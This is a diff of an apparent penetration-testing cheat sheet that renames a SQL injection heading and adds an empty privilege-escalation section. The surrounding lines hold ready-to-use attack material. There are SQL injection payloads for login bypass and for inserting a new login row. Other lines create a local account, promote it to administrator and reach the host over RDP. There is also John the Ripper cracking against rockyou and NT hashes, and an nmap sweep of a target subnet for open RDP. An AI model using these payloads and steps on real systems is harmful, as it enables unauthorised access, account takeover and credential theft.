@@ -92,7 +92,7 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
 ```
-#  SQL Injections
+#  SQL 
 ```
 1- Auth Bypass-  hi'OR 1=1 --
 2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
@@ -159,7 +159,10 @@ john file.hash -wordlist=rockyou.txt
 HTLM
 john --format=NT hashes.txt
 ```
+#Privilege Escalation
+```
 
+```
 #  Some extra work 
 ```
 nmap -p 3389 -iL ip.txt | grep open 		(Check RDP enabled after getting ip- ip.txt contains all the alive hosts from target subnet)
